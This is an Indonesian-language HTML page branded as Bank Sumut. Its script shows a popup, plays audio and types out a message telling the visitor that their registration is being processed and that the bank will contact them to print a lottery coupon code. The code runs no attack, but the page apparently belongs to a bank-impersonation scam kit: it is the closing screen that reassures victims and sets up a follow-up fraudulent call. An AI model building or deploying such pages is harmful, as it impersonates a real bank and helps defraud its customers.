<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Terima Kasih</title>
  <!-- Bootstrap CSS -->
  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet"/>
  <!-- Google Fonts: Poppins -->
  <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;600&display=swap" rel="stylesheet"/>
  <!-- SweetAlert2 -->
  <script src="https://cdn.jsdelivr.net/npm/sweetalert2@11"></script>
  <style>
    body {
      font-family: "Poppins", sans-serif;
      margin: 0;
      /* Atur agar halaman full-height tanpa align center supaya content bisa memenuhi layar */
      min-height: 100vh;
    }

    /* Navbar Full Width & Fixed, background diubah jadi transparan */
    nav {
      width: 100%;
      padding: 0;
      position: fixed;
      top: 0;
      z-index: 10;
      background: transparent;
    }

    nav img {
      width: 100%;      /* Buat gambar navbar memenuhi lebar layar */
      height: auto;
      object-fit: cover; /* Cover area */
      display: block;
    }

    .content {
      margin-top: 60px;  /* Sesuaikan margin agar tidak tertutup navbar */
      text-align: center;
    }

    .img-fluid {
      margin: 0 auto;
      border-top-right-radius: 150px;
      border-bottom-right-radius: 150px;
      max-height: 300px;
      object-fit: cover;
      object-position: top center;
      width: 100%;
    }

    .container {
      background: #fff;
      border-radius: 12px;
      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
      max-width: 600px;
      width: 100%;
      text-align: center;
      padding: 20px;
      margin: 20px auto;
    }

    .message {
      background: linear-gradient(135deg, #4c86c0, #0059b3);
      color: #fff;
      padding: 15px;
      border-radius: 10px;
      font-size: 16px;
      font-weight: 600;
      margin-bottom: 20px;
      /* Buat text area mengisi penuh container */
      width: 100%;
      box-sizing: border-box;
    }

    .footer {
      font-size: 14px;
      color: #777;
      margin-top: 10px;
    }
  </style>
</head>
<body onload="initPage()">

  <!-- Navbar dengan gambar full width -->
  <nav>
    <img src="navbar1.png" alt="Logo Bank Sumut" />
  </nav>

  <div class="content">
    <img src="yoowe.jpg" alt="Ilustrasi Pelanggan" class="img-fluid" />

    <div class="container">
      <div class="message">
        <div id="typingContainer"></div>
      </div>
      <div class="footer">&copy; 2025 BANK SUMUT</div>
    </div>
  </div>

  <audio id="thankYouAudio" src="speech.mp3"></audio>
  <script>
    const typewriterText = `Terimakasih Telah Mendaftar di Layanan Bank Sumut.
  Pendaftaran Anda Sedang Diproses.
  Beberapa Saat Lagi Anda Akan Dihubungi Oleh Pihak Bank Sumut
  Untuk Proses Cetak Kode Kupon Undian Anda.`;
    
    function playAudio() {
      const audio = document.getElementById("thankYouAudio");
      audio.play();
    }
    
    function typeWriterEffect(text, containerId, speed = 40) {
      let index = 0;
      const container = document.getElementById(containerId);
      container.innerHTML = "";
    
      function typeChar() {
        if (index < text.length) {
          container.innerHTML += text.charAt(index);
          index++;
          setTimeout(typeChar, speed);
        }
      }
      typeChar();
    }
    
    function showThankYouAlert() {
      Swal.fire({
        width: '320px',
        imageUrl: "icon.png",
        text: "Lanjut proses Penyelesaian.",
        imageAlt: "Bank Sumut",
        confirmButtonText: "OK",
        confirmButtonColor: "#004080",
      }).then((result) => {
        if (result.isConfirmed) {
          playAudio();
          typeWriterEffect(typewriterText, "typingContainer", 40);
        }
      });
    }
    
    function initPage() {
      showThankYouAlert();
    }
  </script>
</body>
</html>
